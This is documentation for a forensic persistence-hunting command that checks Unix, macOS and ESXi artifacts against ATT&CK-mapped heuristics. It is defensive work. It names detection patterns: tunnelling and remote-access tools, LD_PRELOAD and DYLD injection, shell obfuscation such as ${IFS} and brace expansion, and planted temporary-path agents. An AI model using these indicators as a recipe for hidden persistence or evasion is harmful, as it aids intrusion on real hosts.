# persistence-hunter

`persistence-hunter` parses the persistence artifacts of a collection (Linux, macOS, the BSDs,
Solaris and illumos, ESXi or AIX), runs a
fixed set of checks over each parsed record, and writes one row per finding. Each check is a
heuristic. A finding is a lead to review, not a verdict. A run with no findings does not prove
that a host has no persistence; it means no check matched the records the parsers read. The
command has no rule language: each check is a Rust function in the `CHECKS` table, and a YAML
profile can only allow or block by text and by check id.

## Usage

```
nixcavate persistence-hunter (-d <DIR> | -f <FILE>) [-o <FILE>] [--profile <FILE>] [OPTIONS]
```

Options of the command:

| Flag | Meaning | Default |
|---|---|---|
| `-d, --directory <DIR>` | Evidence directory: a collection, a mounted volume, or a folder of collections and archives. Required unless `-f` is given; conflicts with `-f` | none |
| `-f, --file <FILE>` | Evidence archive (`.tar`, `.tar.gz`, `.tar.zst`, `.tar.xz`, `.zip`). Conflicts with `-d` | none |
| `-o, --output <FILE>` | Output file. An existing file is an error unless `-C` is given | stdout |
| `--profile <FILE>` | YAML profile with `allow` and `block` entries | no profile |
| `--min-severity <SEVERITY>` | Leave out findings below this severity: `info`, `low`, `medium` or `high` | `info` |
| `--show-allowed` | Keep allowed findings in the output, with status `allowed` | off |

Shared options of the commands that parse evidence:

| Flag | Meaning | Default |
|---|---|---|
| `-t, --type <TYPE>` | Output type: `csv`, `json` or `jsonl` | `csv` |
| `-T, --threads <N>` | Worker threads | logical CPUs |
| `-C, --clobber` | Replace an existing `-o` file | off |
| `-q, --quiet` | Do not print the stderr summary. `failed:` lines are still printed | off |
| `-K, --no-color` | Accepted. The hunt summary is not colored, so it has no effect | off |
| `--max-expansion <RATIO>` | How many times the compressed size an archive may expand to before a task stops. `0` for no limit | `100` |
| `--zoneinfo <DIR>` | Zone database used when the evidence names the host zone but lacks its data | `/usr/share/zoneinfo` |

Examples:

```
# Archive to stdout as CSV, medium severity and above
nixcavate persistence-hunter -f collection.tar.gz --min-severity medium

# Directory, with an allow profile, as JSON Lines to a file
nixcavate persistence-hunter -d ./evidence --profile corp-allow.yaml -t jsonl -o hunt.jsonl

# Replace an earlier output file and keep allowed rows visible
nixcavate persistence-hunter -d ./evidence -t json -o hunt.json -C --show-allowed
```

The planted fixtures in `test_files/persistence-hunter/macos` give a small known result:
`nixcavate persistence-hunter -d test_files/persistence-hunter/macos` writes 20 findings.

## How it works

1. **Parse.** The evidence is read by the same parser code as `auto-parse`, restricted to the 74
   artifacts that appear in `CHECKS`:
   `aix-at-jobs`, `aix-genkex`, `aix-inetd-conf`, `aix-inittab`, `aix-rc-scripts`, `aix-rhosts`,
   `anacron`, `at-jobs`, `auth-db`, `authorized-keys`, `bsd-at-jobs`, `bsd-rc-local`, `btm`,
   `config-profiles`, `crle-config`, `cron`, `cron-scripts`, `default-files`, `devd-conf`,
   `doas-conf`, `emond`, `env-config`, `esxi-host-config`, `esxi-permissions`, `esxi-rc-local`,
   `esxi-rc-local-files`, `esxi-vib`, `esxi-vib-list`, `etc-system`, `folder-action-scripts`,
   `init-d`, `inittab`, `jail-conf`, `k8s-manifests`, `kernel-drv`, `kernel-extensions`,
   `kubelet-config`, `launchd`, `ld-preload`, `legacy-rc`, `loader-conf`, `login-window`,
   `logrotate-scripts`, `master-passwd`, `modules-load`, `motd-scripts`, `nm-dispatcher`, `pam`,
   `pam-conf`, `passwd`, `rbac-profiles`, `rc-conf`, `rc-d`, `rc-local`, `rc-scripts`,
   `remote-access-config`, `rhosts`, `shadow`, `shell-profiles`, `smf-manifests`, `smf-repository`,
   `solaris-at-jobs`, `solaris-shadow`, `sshd-config`, `startup-items`, `sudoers`,
   `system-plugins`, `systemd-enablement`, `systemd-generators`, `systemd-units`, `ttys`,
   `udev-rules`, `user-attr`, and `xdg-autostart`.
   Each parser writes JSONL to a private scratch directory, which is removed
   when the run ends.
1a. **Join.** A first pass over the records of `systemd-enablement`, `systemd-units` and
   `passwd` collects what one record cannot say about another: which units are enabled, which
   timer, socket or path unit starts which service and what that service runs, which users
   linger, and which account is the host's uid 1000. A systemd unit record and a sudo rule
   that the facts concern gain a `joined` object (see "systemd enablement and timers"). Only
   those records change; every other record is checked as the parser wrote it.
2. **Check each record.** A record is run through every check whose `artifact` equals the
   record's artifact. A check that returns a reason produces a row with status `finding`.
   When several checks match one record, a check is dropped if another check that matched the
   same record has the same ATT&CK technique and a higher severity. For example, a cron record
   that matches `cron-suspicious-command` (high) and `cron-reboot-job` (low), both T1053.003,
   produces only the high row. Checks of equal severity on one technique are all kept.
3. **Apply block rules.** If the profile has `block` entries, every record is tested. Each
   block entry whose `contains` text appears in a string value of the record produces a row
   with check `block-rule`, severity `high` and status `blocked`. Block rows are not subject to
   the rule in step 2.
4. **Apply allow rules.** For each row, the first `allow` entry whose keys all match sets the
   status to `allowed` and copies its `reason`. Allow entries also apply to block rows.
5. **Filter and sort.** Rows below `--min-severity` are dropped. Allowed rows are dropped unless
   `--show-allowed` is given. Rows are sorted by host, then severity (high first), then
   enabled units before the others (see "systemd enablement and timers"), then check id,
   `source_path`, `source_line` and `source_offset`, all ascending. A missing line or offset
   sorts first.
6. **Write.** Rows go to stdout or to `-o` in the chosen type. Unless `-q` is given, a summary
   goes to stderr. Each failed parser task is reported on stderr as
   `failed: <artifact> <input>: <error>`. Records that a failed task had already written are
   still checked. The exit code is set as described under Output.

## Checks

`CHECKS` has 139 rows: 117 check ids over 74 artifacts. A check id appears more than once when it
reads more than one artifact or needs another technique for another kind of record, for example
`cron-script-writable` (cron scripts and init scripts), `launchd-suspicious-program`
(LaunchAgents and LaunchDaemons), `at-job` (the at queues of Linux, the BSDs and Solaris) and
`esxi-vib-community` (the descriptors in `var/db/esximg/vibs` and the saved `esxcli software vib list`). Each row is listed once below,
under the OS of its artifact (`/etc/environment` exists only on Linux, so its rows are listed
there). Severity is shown as it appears in the output.

### Linux

| Check id | Severity | ATT&CK | What it flags |
|---|---|---|---|
| `at-job` | low | T1053.002 | Any queued `at` job |
| `at-job-suspicious` | high | T1053.002 | `at` job command with a suspicious-command match |
| `anacron-suspicious-command` | high | T1053.003 | anacron job command with a suspicious-command match |
| `systemd-suspicious-exec` | high | T1543.002 | `Exec*` line of a unit (ExecStart, ExecStartPre, ExecStartPost, ExecStop, ExecReload) with a suspicious-command match. The detail ends with the unit's state when links were collected: `[enabled: wanted by multi-user.target]`, `[masked]` or `[not enabled]` |
| `systemd-timer-suspicious-service` | high | T1053.006 | Timer whose service (`Unit=`, else the service of the same name, with its drop-ins) runs a suspicious command. The detail names the service, the timer's state and the command: `timer -> job.service [enabled: wanted by timers.target]: exec_start ...` |
| `systemd-trigger-suspicious-service` | high | T1543.002 | The same for a socket unit (`Service=`) or a path unit (`Unit=`) |
| `systemd-enablement-outside-unit-dirs` | medium | T1543.002 | `wants`/`requires`/`upholds` link, alias or linked unit file whose target is not under `etc/systemd`, `usr/lib/systemd`, `lib/systemd`, `usr/local/lib/systemd` or `run/systemd` (for a user unit also `.config/systemd/user` and `.local/share/systemd/user`), or leaves the host root. Relative targets are resolved as text against the link's directory |
| `systemd-linger` | low | T1543.002 | `var/lib/systemd/linger/<user>` exists: that user's services start at boot and run with no login |
| `systemd-generator-in-etc` | medium | T1543.002 | Any file in `etc/systemd/system-generators` or `etc/systemd/user-generators`. Generators in `usr/lib` are not read: which of those a distribution ships is not knowable here |
| `systemd-user-unit` | low | T1543.002 | Unit file under a `home/`, `root/` or `Users/` path |
| `systemd-ld-preload` | high | T1574.006 | Unit `Environment` sets `LD_PRELOAD=` |
| `rc-local-command` | low | T1037.004 | Any `rc.local` line other than `exit 0` and the exact line `touch /var/lock/subsys/local`, which the RHEL family ships |
| `rc-local-suspicious` | high | T1037.004 | `rc.local` line with a suspicious-command match |
| `ld-preload-entry` | high | T1574.006 | Library listed in `/etc/ld.so.preload` |
| `ld-library-path-writable` | high | T1574.006 | Linker search path in `ld.so.conf` data that is in a temporary directory |
| `udev-run-suspicious` | high | T1546.017 | udev rule command with a suspicious-command match |
| `modprobe-install-command` | medium | T1547.006 | `install` directive that runs a command, unless every statement of it is one of the shapes distributions ship (see "Stock shapes"). `remove` directives are not checked |
| `modules-load-unknown-module` | medium | T1547.006 | Module named in `modules-load.d` or `/etc/modules` that is not a module file, a built-in (`modules.builtin`) or an alias (`modules.alias`) of any kernel under the collected `lib/modules`. No finding when no module file or `modules.dep` was collected (a UAC collection does not hold the tree) |
| `ld-library-path-unusual` | low | T1574.006 | `ld.so.conf` directory outside `/lib*`, `/usr/lib*`, `/usr/libx32`, `/usr/local/lib*` |
| `pam-exec-module` | medium | T1556.003 | `pam_exec.so` in a PAM service line (not `@include`), except the one stock line (see "Stock shapes") |
| `pam-module-unusual-path` | high | T1556.003 | PAM module given by absolute path outside `/lib`, `/lib64`, `/usr/lib`, `/usr/lib64`, `/usr/lib32` and `/lib32` |
| `xdg-autostart-suspicious` | high | T1547.013 | Autostart `Exec` line with a suspicious-command match |
| `passwd-extra-uid0` | high | T1136.001 | Account other than `root` with uid 0 |
| `passwd-password-in-passwd` | medium | T1078.003 | Password field in `/etc/passwd` that is not `x`, `*` or `!` (including empty) |
| `shadow-passwordless` | high | T1078.003 | Account that can log in without a password |
| `sudoers-nopasswd-all` | medium | T1548.003 | sudo rule with `NOPASSWD` and `ALL` commands, except the default-account shape below |
| `sudoers-default-account-nopasswd` | low | T1548.003 | `<user> ALL=(ALL) NOPASSWD:ALL` (run-as `ALL` or `ALL:ALL`) for the host's uid 1000 account, in `etc/sudoers.d/90-cloud-init-users` or `etc/sudoers`: what a cloud image gives its built-in account. Any other file, user or shape stays `sudoers-nopasswd-all` |
| `motd-script-suspicious` | high | T1037 | `etc/update-motd.d/*` line (run as root at every login on Debian and Ubuntu) with a suspicious-command match |
| `nm-dispatcher-suspicious` | high | T1546 | `etc/NetworkManager/dispatcher.d/*` line (including `pre-up.d` and similar) with a suspicious-command match |
| `logrotate-script-suspicious` | high | T1053 | Line of a `prerotate`, `postrotate`, `firstaction`, `lastaction` or `preremove` block in `etc/logrotate.conf` or `etc/logrotate.d/*` with a suspicious-command match |
| `environment-ld-preload` | high | T1574.006 | `LD_PRELOAD` or `LD_AUDIT` set to anything, or `LD_LIBRARY_PATH` with a temporary directory, in `/etc/environment`, `etc/security/pam_env.conf` or `etc/environment.d/*.conf` (`NAME=value`, `export`, and pam_env's `NAME DEFAULT=` / `OVERRIDE=`) |
| `environment-path-hijack` | medium | T1574.007 | `PATH` with an empty or `.` entry, a temporary directory or a hidden directory, in the same files |
| `sshd-authorized-keys-command` | medium | T1098.004 | `AuthorizedKeysCommand` other than `none` and the two commands that systemd and SSSD ship (`/usr/bin/userdbctl ssh-authorized-keys %u`, `/usr/bin/sss_ssh_authorizedkeys %u`) in `etc/ssh/sshd_config` or `sshd_config.d/*.conf` |
| `sshd-force-command` | medium | T1098.004 | `ForceCommand` other than `none` and `internal-sftp` (with or without arguments). The detail names the `Match` block |
| `sshd-command-suspicious` | high | T1098.004 | `AuthorizedKeysCommand` or `ForceCommand` with a suspicious-command match |
| `cron-script-writable` | medium | T1037.004 | Init script (`init.d`) that is group- or world-writable, or not owned by root |

### Kubernetes, remote-access tools and tunnels (Linux)

Added with the artifacts `k8s-manifests`, `kubelet-config`, `remote-access-config` and the
existing command-bearing artifacts. `remote-tool-autostart` (6 rows: `systemd-units`, `cron`,
`anacron`, `at-jobs`, `rc-local`, `xdg-autostart`) and `ssh-tunnel-command` (5 rows: the same
without `xdg-autostart`) appear once per artifact.

| Check id | Severity | ATT&CK | What it flags |
|---|---|---|---|
| `k8s-static-pod-unexpected` | medium | T1053.007 | A manifest in `etc/kubernetes/manifests` (or k3s `agent/pod-manifests`) whose file is not `kube-apiserver`, `etcd`, `kube-controller-manager` or `kube-scheduler`; k3s ships no static pod. One finding per file |
| `k8s-static-pod-host-access` | high | T1610 | A static pod with `privileged`, `hostPID` or `hostNetwork` and a `hostPath` of `/` or ending in `docker.sock`, `containerd.sock` or `crio.sock`. The stock control-plane pods mount certificates and kubeconfigs, not these |
| `k3s-auto-apply-not-stock` | medium | T1053.007 | A file under `var/lib/rancher/k3s/server/manifests` that k3s v1.34 does not write (`ccm`, `coredns`, `local-storage`, `rolebindings`, `runtimes`, `traefik`, `metrics-server/*`). A stock file overwritten with other content is not told |
| `kubelet-anonymous-auth` | high | T1556 | `authentication.anonymous.enabled: true` or `--anonymous-auth=true` |
| `kubelet-authorization-always-allow` | high | T1556 | `authorization.mode: AlwaysAllow` or `--authorization-mode=AlwaysAllow` |
| `remote-tool-autostart` | low | T1219 | A unit `Exec*` line, cron, anacron, at, `rc.local` or autostart command that starts AnyDesk, TeamViewer, RustDesk, MeshAgent, ngrok, cloudflared, `tailscaled`, ZeroTier, frp, chisel, gost, rathole or `code tunnel`, by program name. Tailscale on a host that uses it is expected |
| `ssh-tunnel-command` | medium | T1572 | `ssh` or `autossh` with `-R`, `-L`, `-D`, `-w` or a `RemoteForward`, `LocalForward`, `DynamicForward` or `Tunnel` option before the destination (what follows the destination is the remote command and is not read) |
| `remote-access-tool-present` | info | T1219 | A remote-access, tunnel or VPN configuration is present: the detail names the tool, user, ID, name and server |
| `tunnel-exposes-local-service` | medium | T1572 | An ngrok tunnel, a frp proxy or a cloudflared ingress rule (other than the `http_status:` catch-all) that publishes a local service |
| `vscode-tunnel-service-account` | medium | T1219.001 | `code_tunnel.json` under `root` or a service account's home (`www-data`, `nobody`, `daemon`, `git`, `postgres`, `mysql`, `jenkins`, `gitlab-runner`, `tomcat`, `nginx`, `apache`) |
| `vpn-hook-suspicious` | high | T1546 | A WireGuard `PreUp`, `PostUp`, `PreDown` or `PostDown`, or an OpenVPN `up`, `down`, `route-up`, `client-connect`, `plugin` or `tls-verify` command with a suspicious-command match |

The tool names come from program names in a command, so a path or word that merely contains one
(`echo anydesk`) matches; the rules do not follow shell context. Whether a unit is enabled is
shown by the existing `[enabled: ...]` suffix on the `systemd-units` findings.

### macOS

| Check id | Severity | ATT&CK | What it flags |
|---|---|---|---|
| `launchd-suspicious-program` | high | T1543.001 | LaunchAgent whose command matches a suspicious-command rule, or that runs `curl` |
| `launchd-suspicious-program` | high | T1543.004 | LaunchDaemon whose command matches a suspicious-command rule, or that runs `curl` |
| `launchd-apple-label-outside-system` | medium | T1036.004 | `com.apple.` label in a plist outside `System/Library/`, except a user agent that runs a binary under `/System/` or `/usr/` |
| `launchd-user-agent-persistent` | low | T1543.001 | User agent that runs at load or is kept alive, and starts a program outside `/Applications/`, `/System/`, `/Library/` and `/usr/` |
| `launchd-dyld-insert` | high | T1574.006 | Job sets `DYLD_INSERT_LIBRARIES` |
| `emond-rule-command` | high | T1546.014 | Enabled Event Monitor rule with a command |
| `kext-third-party` | low | T1547.006 | Any kernel extension record |
| `btm-item-unsigned` | low | T1547.015 | Background item with no team ID and a developer name that is empty or `Unknown Developer`, outside `/System/` |
| `login-hook` | medium | T1037.002 | `LoginHook` or `LogoutHook` set in `com.apple.loginwindow.plist` (login-window) |
| `login-hook-suspicious` | high | T1037.002 | A login or logout hook whose command matches a suspicious-command rule |
| `relaunch-app-user-location` | low | T1547.007 | Application in `TALAppsToRelaunchAtLogin` outside `/Applications/`, `/System/`, `/Library/` and `/usr/` |
| `auth-db-admin-rule-allow` | high | T1556 | `system.privilege.admin` has class `allow` in `auth.db`. The default, from Apple's open-source Security framework (`authorization.plist`), is class `user`, group `admin`. No other rule is judged: no other default could be cited |
| `startup-item` | medium | T1037.005 | Any file in `Library/StartupItems/` (deprecated since OS X 10.10; a default install has none) |
| `legacy-rc-command` | medium | T1037.004 | Any command line in `rc.local` or `launchd.conf` (`rc.common` is stock and not judged) |
| `legacy-rc-suspicious` | high | T1037.004 | A command in `rc.local` or `launchd.conf` that matches a suspicious-command rule |
| `folder-action-script` | medium | T1546 | Any file in `Library/Scripts/Folder Action Scripts/` |
| `authorization-plugin` | medium | T1556 | A bundle in `Library/Security/SecurityAgentPlugins/` or `Library/DirectoryServices/PlugIns/` whose bundle id does not start with `com.apple.` (Apple's own plug-ins live under `/System`) |
| `config-profile-root-certificate` | medium | T1553.004 | An installed configuration profile with a `com.apple.security.root` payload. MDM-managed Macs install these legitimately |

### Both systems

| Check id | Severity | ATT&CK | What it flags |
|---|---|---|---|
| `cron-suspicious-command` | high | T1053.003 | Crontab command with a suspicious-command match |
| `cron-reboot-job` | low | T1053.003 | Crontab entry with schedule `@reboot` |
| `cron-script-writable` | medium | T1053.003 | Script in a `cron.*` or periodic directory that is group- or world-writable, or not owned by root |
| `shell-profile-suspicious` | medium | T1546.004 | Startup-file line with a suspicious-command match, or that sets `LD_PRELOAD=`, `alias sudo=` or `alias su=`, or assigns `PROMPT_COMMAND` (`=` or `+=`) a value that is not one of the ordinary shapes (see "Stock shapes"). Comment lines are skipped. `/etc/environment` is not read as shell code: the `environment-*` checks read it |
| `authorized-key-forced-command` | medium | T1098.004 | `authorized_keys` entry with a forced command |
| `authorized-key-root` | low | T1098.004 | SSH key authorized for `root` |


### Solaris and illumos

Read from the Solaris artifacts (`smf-repository`, `smf-manifests`, `inittab`, `rc-scripts`, `crle-config`, `etc-system`, `kernel-drv`,
`user-attr`, `rbac-profiles`, `solaris-at-jobs`, `solaris-shadow`, `default-files`, `pam-conf`, `rhosts`). The shared checks
(`cron-*`, `shell-profile-suspicious`, `authorized-key-*`) also run on Solaris cron tabs, `etc/profile`, `etc/.login` and the other startup files.

| Check id | Severity | ATT&CK | What it flags |
|---|---|---|---|
| `smf-start-method-suspicious` | high | T1543 | Start method of a service that is not disabled that runs from a temporary or hidden path or matches a suspicious command |
| `smf-site-service-enabled` | low | T1543 | Enabled service in the `site` category or imported from a `manifest/site` file |
| `smf-manifest-suspicious-exec` | high | T1543 | Start, stop or refresh method of a site manifest with the same rule |
| `smf-manifest-site` | low | T1543 | Any locally added manifest |
| `inittab-unusual-entry` | medium | T1037.004 | `inittab` entry whose id is not one of the stock `ap`, `sp`, `smf`, `p3`, `s0`, `s1`, `s5`, `s6` |
| `inittab-suspicious-command` | high | T1037.004 | `inittab` command with a suspicious-command match |
| `rc-script-suspicious` | high | T1037.004 | Command of an `rc?.d` or `init.d` script with a suspicious-command match |
| `rc-script-writable` | medium | T1037.004 | `rc` script that is group- or world-writable or not owned by root |
| `crle-path-outside-system` | medium | T1574.006 | Default library path of `crle` with a directory outside `/lib`, `/usr/lib`, `/opt/ooce`, `/platform` and the other system directories |
| `crle-path-temporary` | high | T1574.006 | The same path in a temporary, hidden or per-user directory |
| `crle-environment-setting` | high | T1574.006 | The configuration sets an environment variable (`LD_PRELOAD`...) |
| `etc-system-forceload` | medium | T1547.006 | `forceload:` in `/etc/system` |
| `etc-system-moddir` | high | T1547.006 | `moddir:` in `/etc/system` |
| `kernel-drv-conf-without-module` | medium | T1547.006 | Driver `.conf` file with no module of that name in a collected `kernel/drv` tree |
| `user-attr-root-equivalent` | medium | T1098 | Account other than root with the `All`, `Primary Administrator` or `Software Installation` profile, or `solaris.*` |
| `rbac-exec-attr-root-outside-system` | high | T1548 | Profile that runs a program as uid 0 or with all privileges from outside the system directories |
| `at-job` | low | T1053.002 | Any `at` job (Solaris artifact `solaris-at-jobs`) |
| `at-job-suspicious` | high | T1053.002 | The same job with a suspicious command |
| `shadow-passwordless` | high | T1078.003 | Account with an empty password in `solaris-shadow` |
| `login-su-defaults` | high | T1556 | `PASSREQ=NO` in `etc/default/login`, or a `PATH`/`SUPATH` of `login` or `su` with an empty, `.` or temporary directory |
| `pam-module-unusual-path` | high | T1556.003 | `pam.conf` module with an absolute path outside `/usr/lib/security`, `/lib/security` and `/usr/lib` |
| `rhosts-wildcard` | high | T1021 | `hosts.equiv` or `.rhosts` line that trusts every host or user (`+`) |
| `rhosts-entry` | low | T1021 | Any other r-command trust entry that is not a denial |

Verified on OmniOS guests with planted examples (marker `NXMK_*`): an enabled SMF service with a method script, an enabled
site service whose method is `/tmp/.NXMK_SMFLIB/agent`, an `inetconv` service (`/tmp/.NXMK_INETD/agent`), `rc2.d` and `rc3.d` scripts, an
`inittab` line, `crle` paths in both ELF classes, `/etc/system` `forceload`, a driver `.conf`, a user and a profile that runs a program as root, `.rhosts`
and `hosts.equiv`, PAM, root crontab, an `at` job, `/etc/profile`, `/etc/.login`, `~/.profile`, `~/.kshrc`, `PASSREQ=NO` and `SUPATH`: 24 of the 28 examples in the evidence are flagged (25 with a collected `kernel/drv`; see `docs/LIMITATIONS.md`). Not detected: the lines of `/etc/default/*` other than the two named, `/etc/project`, `/etc/inet/inetd.conf`
(legacy), a service whose state is `maintenance` because its start method is missing (it is listed, and flagged by its path).

### ESXi

ESXi hosts are also judged by the "Both systems" rows above: `cron` reads root's crontab
(`var/spool/cron/crontabs/root`) and `authorized-keys` reads `etc/ssh/keys-<user>/`. UAC's
`esxi` collection and a `vm-support` bundle have `etc` (so `etc/rc.local.d`, `authorization.xml`
and `hostsvc.xml`) but not `var/db/esximg/vibs`; for them the VIB rows come from the saved
`esxcli software vib list` (`esxi-vib-list`), which has no file list, so `esxi-vib-startup-file`
needs the descriptors of a disk image or a live copy.

| Check id | Severity | ATT&CK | What it flags |
|---|---|---|---|
| `esxi-rc-local-command` | medium | T1037.004 | A line other than `exit 0` in a shell script of `etc/rc.local.d` (comments and blank lines are not records). `/etc/rc.local` runs every executable file in the folder at boot |
| `esxi-rc-local-suspicious` | high | T1037.004 | A line of such a script with a suspicious-command match |
| `esxi-rc-local-unexpected-file` | medium | T1037.004 | A file in `etc/rc.local.d` that a stock image does not have (`local.sh`, `kickstart.py`, `cleanupStatefulHost.py` and `autodeploy/` are stock), executable or with no recorded mode, and not hidden |
| `esxi-vib-community` | medium | T1543 | A VIB whose acceptance level is `community` / `CommunitySupported`: not signed by VMware or a partner. Both the descriptor and the saved `esxcli software vib list` |
| `esxi-vib-startup-file` | high | T1037.004 | A VIB whose file list puts a file in `etc/init.d`, `etc/rc.local.d`, `var/spool/cron` or `etc/cron*` |
| `esxi-admin-permission` | medium | T1098 | A local account or group other than `root`, `dcui` and `vpxuser` with the Administrator role (`-1`) in `authorization.xml`. A group named `ESX Admins` is the default group of the Active Directory integration |
| `esxi-ssh-at-boot` | low | T1133 | `hostsvc.xml` sets `TSM-SSH` or `TSM` (the ESXi Shell) to `on`: the service starts with the host |

The text of the VIB and `rc.local.d` checks was exercised with planted files only; no real
malicious VIB or `local.sh` was available (see "VMware ESXi" in `docs/LIMITATIONS.md`). The
technique ids are the nearest ATT&CK entries, because ATT&CK has no entry for VIBs.

### FreeBSD, OpenBSD and NetBSD

BSD hosts are also judged by the rows that read shared artifacts (`cron`, `shell-profiles`,
`authorized-keys`, `sudoers`, `passwd`). The rows below read the BSD boot and service files; the
text in the last column is the finding's title. They were exercised with files planted on FreeBSD
14, OpenBSD 7.8 and NetBSD 10.1 guests (see [LIMITATIONS.md](LIMITATIONS.md)).

| Check id | Artifact | Severity | ATT&CK | Title |
|---|---|---|---|---|
| `rc-local-command` | `bsd-rc-local` | low | T1037.004 | rc.local runs a command at boot |
| `rc-local-suspicious` | `bsd-rc-local` | high | T1037.004 | rc.local runs a suspicious command |
| `at-job` | `bsd-at-jobs` | low | T1053.002 | Queued at job |
| `at-job-suspicious` | `bsd-at-jobs` | high | T1053.002 | At job runs a suspicious command |
| `rc-d-script-writable` | `rc-d` | medium | T1037.004 | rc.d script is writable or not owned by root |
| `rc-d-suspicious-command` | `rc-d` | high | T1037.004 | rc.d script runs a suspicious command |
| `rc-conf-suspicious-service` | `rc-conf` | high | T1037.004 | Service enabled in rc.conf starts a suspicious command |
| `loader-module-load` | `loader-conf` | low | T1547.006 | Kernel module loaded at boot |
| `ttys-nonstandard-command` | `ttys` | medium | T1037.004 | Terminal entry runs a program other than a getty |
| `ttys-suspicious-command` | `ttys` | high | T1037.004 | Terminal entry runs a suspicious command |
| `doas-permit-nopass` | `doas-conf` | medium | T1548.003 | doas rule allows every command without a password |
| `devd-action-suspicious` | `devd-conf` | high | T1546 | devd action runs a suspicious command |
| `jail-exec-suspicious` | `jail-conf` | high | T1543 | Jail start or stop command is suspicious |
| `master-passwd-extra-uid0` | `master-passwd` | high | T1136.001 | Account other than root with uid 0 |
| `master-passwd-passwordless` | `master-passwd` | high | T1078.003 | Account has an empty password |

### IBM AIX

On an AIX host the hunter also parses `aix-inittab`, `aix-rc-scripts`, `aix-inetd-conf`,
`aix-rhosts`, `aix-at-jobs` and `aix-genkex`, and the shared `cron`, `shell-profiles`, `authorized-keys`
and `passwd` records are checked as on other systems. No AIX evidence was available: these checks
rest on the documented formats only (see [LIMITATIONS.md](LIMITATIONS.md)).

| Check id | Severity | ATT&CK | What it flags |
|---|---|---|---|
| `aix-inittab-suspicious-command` | high | T1037.004 | `inittab` command with a suspicious-command match |
| `aix-inittab-nonsystem-command` | medium | T1037.004 | `inittab` command whose program is an absolute path outside `/etc`, `/usr`, `/sbin`, `/bin`, `/opt`, `/lib` and `/var/opt` (there is no list of stock entries) |
| `aix-at-job` | low | T1053.002 | Any queued at job |
| `aix-at-job-suspicious` | high | T1053.002 | At job whose last script lines match a suspicious-command rule |
| `aix-rc-suspicious` | high | T1037.004 | Line of `etc/rc`, `rc.local`, `rc.tcpip`, `rc.nfs`, `rc.net` or `rc.d` with a suspicious-command match |
| `aix-inetd-suspicious-command` | high | T1543 | `inetd.conf` service whose program and arguments match a suspicious-command rule |
| `aix-inetd-shell-service` | high | T1059.004 | `inetd.conf` service that runs a shell |
| `aix-rhosts-wildcard` | high | T1021 | `+` as host or user in `.rhosts` or `hosts.equiv` |
| `aix-rhosts-user-file` | medium | T1021 | Any non-denying entry of a `.rhosts` file |
| `aix-loader-hijack` | high | T1574.006 | A startup file or `etc/environment` sets `LDR_PRELOAD` or `LDR_PRELOAD64`, or a `LIBPATH` directory in a temporary location |
| `aix-kernel-extension-in-temp` | high | T1547.006 | A kernel extension in `genkex` output loaded from a temporary directory |

## systemd enablement and timers

Unit files and the links that enable them are read by two artifacts. `systemd-units` parses the
unit files and drop-ins as before. `systemd-enablement` reads the symlinks and two kinds of
empty file, as text. A link's target is shown and never followed, so a target that points
outside the host, or at a control character, does no harm.

| Evidence | Meaning |
|---|---|
| `etc/systemd/system/<target>.wants/<unit>`, `.requires/`, `.upholds/` | `<unit>` is enabled by `<target>` (what `systemctl enable` creates). Same under `etc/systemd/user` and `home/<user>/.config/systemd/user` and `root/.config/systemd/user`, where the unit belongs to that user |
| A link directly in a unit directory | An alias or a linked unit file (`kind: link`) |
| A link to `/dev/null`, or an empty unit file | Masked |
| `var/lib/systemd/linger/<user>` | The user lingers |
| `usr/lib/systemd` and `lib/systemd` | Vendor presets. They are **not** enablement and are not read as links |

A unit record gains `joined.enablement`: `enabled`, `masked` or `not-enabled`, and
`joined.enabled_by` (for example `wanted by multi-user.target`). A unit is `enabled` when a
link names it (or its template, or an alias that names it) or when a timer, socket or path unit
that starts it is enabled (`started by job.timer, wanted by timers.target`). The claim
`not-enabled` is made only when links of that scope (system or user) were collected at all:
a collection with no enablement links says nothing either way, and the detail has no suffix.
`joined.starts` on a timer, socket or path unit holds the service it starts (`Unit=`/`Service=`,
else the service of the same name) and that service's `Exec*` lines, drop-ins included.
`joined.owner_lingers` names the owner of a user unit who lingers.

Ranking: the severity scheme is unchanged. Within one severity, the findings about enabled
units come before the others, so an enabled unit with a suspicious `ExecStart` is listed
before a dormant file with the same text. A dormant unit keeps its severity: an attacker can
start it by other means, and a collection can lack the links.

## Stock shapes

Some checks leave out lines that distributions ship. Each rule names the shape and nothing
wider, and each has a test for the shape and for a look-alike that is still reported.

| Check | Left out | Still reported |
|---|---|---|
| `shell-profile-suspicious` | A `PROMPT_COMMAND` value in which every statement is `printf` or `echo` without redirection or substitution, a variable assignment, `$PROMPT_COMMAND`, `__vte_prompt_command`, or one of `/etc/sysconfig/bash-prompt-xterm`, `-screen`, `-default`; `()` and an empty value. The value is read as the shell reads it (quotes joined, arrays `+=(...)`) | Any other command or path, `$(...)`, backticks, a redirection, `history -a` |
| `modprobe-install-command` | An `install` whose statements (split at `;`, `&&`, `||` and braces) are all `true`, `false`, `:`, `modprobe` of module names (no argument with a `/`), `sysctl` of `net.` settings or `--system`, or `mount -t rpc_pipefs\|nfsd\|binfmt_misc` below `/proc` or `/var/lib/nfs`, with at most the redirection `> /dev/null 2>&1` | A program outside `/bin`, `/sbin`, `/usr/bin` and `/usr/sbin`, `modprobe` of a path, any other `sysctl` key, `mount` elsewhere, redirections, `$(...)` |
| `pam-exec-module` | `pam_exec.so` with the options `quiet`, `stdout`, `type=open_session`, `type=close_session` and exactly `/bin/uname -snrvm` (Debian 8 `pam.d/login`) | Any other command |
| `rc-local-command` | Exactly `touch /var/lock/subsys/local` | The same text followed by anything |
| `sudoers-default-account-nopasswd` | Lower severity (not silence) for the uid 1000 account in the two files above | Another user, another file, another shape |
| csh `foreach name (list)` | The list is data, not a command (`"$HOME/.i18n"` after `(`) | A command on its own line |

## What counts as a suspicious command

Several checks call `suspicious_command` on a command line. Before the rules run, the line is
read as a shell reads it:

- A `#` that starts a word begins a comment, which is removed.
- Quotes are removed. `${IFS}` and `$IFS` are read as spaces, and newlines as `;`.
- Brace lists are expanded, so `{echo,hi}` is `echo hi`.
- The line is split at `;`, `|`, `&`, `(` and `)`, except in redirections such as `2>&1`.
- Assignments and wrapper commands (`sudo`, `doas`, `env`, `nohup`, `timeout`, `exec` and
  similar) are skipped to find the command word.
- `sh -c "..."` (and the other shells, and `bash`) is split so that the string is read as a
  command of its own.

The rules are checked in the order below. The first rule that matches gives the reason. The
detail of the row is `<reason>: <command>`.

| Reason | Matches when | Example that matches |
|---|---|---|
